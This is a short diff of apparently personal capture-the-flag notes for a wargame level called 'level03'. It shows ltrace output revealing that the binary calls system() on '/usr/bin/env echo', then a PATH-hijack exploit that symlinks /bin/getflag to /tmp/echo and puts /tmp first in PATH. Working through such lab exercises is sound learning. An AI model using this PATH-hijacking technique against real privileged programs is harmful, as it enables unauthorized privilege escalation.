@@ -10,6 +10,10 @@ getegid
 
 Googled that we can use exploit by redefine any used function
 https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code
+
+ltrace ./level03
+system("/usr/bin/env echo Exploit me"Exploit me
+
 We redefined echo with:
 ln -s /bin/getflag /tmp/echo
 PATH=/tmp:$PATH
